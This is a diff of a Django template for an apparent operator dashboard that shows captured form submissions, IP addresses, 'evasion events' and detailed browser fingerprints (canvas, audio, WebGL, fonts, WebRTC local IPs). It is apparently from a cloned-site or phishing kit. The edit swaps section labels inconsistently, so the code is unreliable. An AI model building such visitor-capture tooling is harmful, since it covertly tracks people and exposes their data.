@@ -1,4 +1,4 @@
-{% extends 'base/clone.html' %}
+{% extends 'base/base.html' %}
 
 {% load static %}
 
@@ -24,13 +24,13 @@
                     <div class="log-content">
                         <div class="log-meta">
                             <span class="log-page">{{ log.page|truncatechars:40 }}</span>
-                            <span class="log-ip">📡 {{ log.ip }}</span>
+                            <span class="log-ip">📡 {{ log.ip_address }}</span>
                             <span class="log-time">🕒 {{ log.timestamp }}</span>
                         </div>
                         <div class="log-data">
                             <details>
                                 <summary>View submission data</summary>
-                                <pre>{{ log.data|escape }}</pre>
+                                <pre>{{ log.additional_data|escape }}</pre>
                             </details>
                         </div>
                     </div>
@@ -89,10 +89,10 @@
         </section>
 
         <section class="log-section">
-            <h2 class="section-title">🖥️ Browser Fingerprints <span class="badge">{{ fingerprints|length }}</span></h2>
+            <h2 class="section-title"> 🛡️ Evasion Events <span class="badge">{{ fingerprints|length }}</span></h2>
             <div class="log-items">
                 {% for fp in fingerprints %}
-                <div class="log-item fingerprint">
+                <!-- <div class="log-item fingerprint">
                     <div class="log-icon">🖥️</div>
                     <div class="log-content">
                         <div class="log-meta">
@@ -116,31 +116,152 @@
                             </details>
                         </div>
                     </div>
-                </div>
+                </div> -->
                 {% empty %}
-                <div class="empty-state">No fingerprint data captured</div>
+                <div class="empty-state">No Evasion Events data captured</div>
                 {% endfor %}
             </div>
         </section>
 
         <section class="log-section">
-            <h2 class="section-title">🛡️ Evasion Events <span class="badge">{{ evasions|length }}</span></h2>
+            <h2 class="section-title">🖥️ Browser Fingerprints <span class="badge">{{ evasions|length }}</span></h2>
             <div class="log-items">
-                {% for evasion in evasions %}
-                <div class="log-item evasion">
-                    <div class="log-icon">⚠️</div>
+                {% for fp in fingerprints %}
+                <div class="log-item fingerprint">
+                    <div class="log-icon">
+                        {% if fp.device_type == "mobile" %}📱
+                        {% elif fp.device_type == "tablet" %}⌨️
+                        {% else %}🖥️
+                        {% endif %}
+                    </div>
                     <div class="log-content">
-                        <div class="log-meta">
-                            <span class="log-ip">📡 {{ evasion.ip }}</span>
-                            <span class="log-time">🕒 {{ evasion.timestamp }}</span>
+                        <div class="log-header">
+                            <span class="log-ip">📡 {{ fp.ip_address }}</span>
+                            <span class="log-time">🕒 {{ fp.timestamp|date:"Y-m-d H:i:s" }}</span>
+                            <span class="log-device">{% if fp.device_type %}{{ fp.device_type|title }}{% else %}Unknown{% endif %}</span>
                         </div>
-                        <div class="log-data">
-                            {{ evasion.info }}
+                
+                        <div class="fingerprint-grid">
+                            <!-- Basic Info -->
+                            <div class="fp-section">
+                                <h3>🌐 Browser Info</h3>
+                                <div><span class="fp-label">User Agent:</span> <code>{{ fp.user_agent|truncatechars:80 }}</code></div>
+                                <div><span class="fp-label">Platform:</span> {{ fp.platform|default:"Unknown" }}</div>
+                                <div><span class="fp-label">Languages:</span> {{ fp.languages|default:"Unknown" }}</div>
+                                <div><span class="fp-label">CPU Class:</span> {{ fp.cpu_class|default:"Unknown" }}</div>
+                            </div>
+                
+                            <!-- Hardware -->
+                            <div class="fp-section">
+                                <h3>⚙️ Hardware</h3>
+                                <div><span class="fp-label">Cores:</span> {{ fp.hardware_concurrency|default:"Unknown" }}</div>
+                                <div><span class="fp-label">Memory:</span> {{ fp.device_memory|default:"Unknown" }} GB</div>
+                                <div><span class="fp-label">Screen:</span> {{ fp.screen_resolution }} ({{ fp.color_depth }}bit)</div>
+                                <div><span class="fp-label">Pixel Ratio:</span> {{ fp.pixel_ratio|default:"1.0" }}</div>
+                            </div>
+                
+                            <!-- Network -->
+                            <div class="fp-section">
+                                <h3>📶 Network</h3>
+                                <div><span class="fp-label">Type:</span> {{ fp.connection_type|default:"Unknown" }}</div>
+                                <div><span class="fp-label">Effective:</span> {{ fp.effective_connection|default:"Unknown" }}</div>
+                                <div><span class="fp-label">Downlink:</span> {{ fp.downlink|default:"Unknown" }} Mbps</div>
+                                <div><span class="fp-label">RTT:</span> {{ fp.rtt|default:"Unknown" }} ms</div>
+                            </div>
+                
+                            <!-- Advanced Fingerprints -->
+                            <div class="fp-section">
+                                <h3>🔍 Fingerprints</h3>
+                                <div class="fp-collapsible">
+                                    <details>
+                                        <summary>WebGL</summary>
+                                        <div><span class="fp-label">Vendor:</span> {{ fp.webgl_vendor|default:"Unknown" }}</div>
+                                        <div><span class="fp-label">Renderer:</span> {{ fp.webgl_renderer|default:"Unknown" }}</div>
+                                    </details>
+                                </div>
+                                <div class="fp-collapsible">
+                                    <details>
+                                        <summary>Audio Context</summary>
+                                        <code>{{ fp.audio_hash|truncatechars:40|default:"Unknown" }}</code>
+                                    </details>
+                                </div>
+                                <div class="fp-collapsible">
+                                    <details>
+                                        <summary>Canvas</summary>
+                                        <code>{{ fp.canvas_hash|truncatechars:40|default:"Unknown" }}</code>
+                                    </details>
+                                </div>
+                            </div>
                         </div>
+                
+                        <!-- Extended Data -->
+                        <div class="fp-extended">
+                            <details>
+                                <summary>📊 View Detailed Fingerprint</summary>
+                                <div class="detailed-grid">
+                                    <div>
+                                        <h4>🛡️ Privacy</h4>
+                                        <div><span class="fp-label">Do Not Track:</span> {{ fp.do_not_track|yesno:"Yes,No,Unknown" }}</div>
+                                        <div><span class="fp-label">Cookies:</span> {{ fp.cookie_enabled|yesno:"Enabled,Disabled,Unknown" }}</div>
+                                        <div><span class="fp-label">PDF Viewer:</span> {{ fp.pdf_viewer_enabled|yesno:"Enabled,Disabled,Unknown" }}</div>
+                                    </div>
+                
+                                    <div>
+                                        <h4>🔌 Plugins</h4>
+                                        {% if fp.plugins %}
+                                            {% for plugin in fp.plugins|slice:":5" %}
+                                            <div>{{ plugin.name|default:"Unknown" }}</div>
+                                            {% endfor %}
+                                            {% if fp.plugins|length > 5 %}
+                                            <div>+{{ fp.plugins|length|add:"-5" }} more</div>
+                                            {% endif %}
+                                        {% else %}
+                                            <div>No plugins detected</div>
+                                        {% endif %}
+                                    </div>
+                
+                                    <div>
+                                        <h4>🔤 Fonts</h4>
+                                        {% if fp.fonts %}
+                                            {% for font in fp.fonts|slice:":5" %}
+                                            <div>{{ font|default:"Unknown" }}</div>
+                                            {% endfor %}
+                                            {% if fp.fonts|length > 5 %}
+                                            <div>+{{ fp.fonts|length|add:"-5" }} more</div>
+                                            {% endif %}
+                                        {% else %}
+                                            <div>No font data</div>
+                                        {% endif %}
+                                    </div>
+                
+                                    <div>
+                                        <h4>🌍 Location</h4>
+                                        <div><span class="fp-label">Timezone:</span> {{ fp.timezone|default:"Unknown" }}</div>
+                                        <div><span class="fp-label">Locale:</span> {{ fp.locale|default:"Unknown" }}</div>
+                                        {% if fp.webrtc_ips %}
+                                        <div><span class="fp-label">Local IPs:</span> 
+                                            {% for ip in fp.webrtc_ips|slice:":3" %}
+                                            <code>{{ ip }}</code>{% if not forloop.last %}, {% endif %}
+                                            {% endfor %}
+                                        </div>
+                                        {% endif %}
+                                    </div>
+                                </div>
+                            </details>
+                        </div>
+                
+                        <!-- Raw Data -->
+                        <details class="raw-details">
+                            <summary>📄 View Raw Data</summary>
+                            <pre>{{ fp.raw_data|pprint }}</pre>
+                        </details>
                     </div>
                 </div>
                 {% empty %}
-                <div class="empty-state">No evasion events detected</div>
+                <div class="empty-state">
+                    <div class="empty-icon">🔍</div>
+                    <div class="empty-text">No fingerprint data captured yet</div>
+                </div>
                 {% endfor %}
             </div>
         </section>
@@ -197,7 +318,68 @@
         gap: 0.75rem;
         flex-wrap: wrap;
     }
+    .fingerprint-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 1rem;
+    margin-bottom: 1rem;
+    }
 
+    .fp-section {
+        background: rgba(0,0,0,0.05);
+        padding: 1rem;
+        border-radius: 8px;
+    }
+
+    .fp-section h3 {
+        margin-top: 0;
+        margin-bottom: 0.5rem;
+        font-size: 0.9rem;
+        color: #666;
+    }
+
+    .fp-label {
+        display: inline-block;
+        min-width: 100px;
+        font-weight: bold;
+        color: #555;
+    }
+
+    .detailed-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1rem;
+        margin-top: 1rem;
+    }
+
+    .raw-details pre {
+        max-height: 300px;
+        overflow: auto;
+        background: #f5f5f5;
+        padding: 1rem;
+        border-radius: 4px;
+        font-size: 0.8rem;
+    }
+
+    .fp-collapsible details {
+        margin-bottom: 0.5rem;
+    }
+
+    .fp-collapsible summary {
+        cursor: pointer;
+        font-weight: bold;
+    }
+
+    .empty-state {
+        text-align: center;
+        padding: 2rem;
+        color: #666;
+    }
+
+    .empty-icon {
+        font-size: 2rem;
+        margin-bottom: 0.5rem;
+    }
     .stat-badge {
         padding: 0.25rem 0.75rem;
         border-radius: 20px;
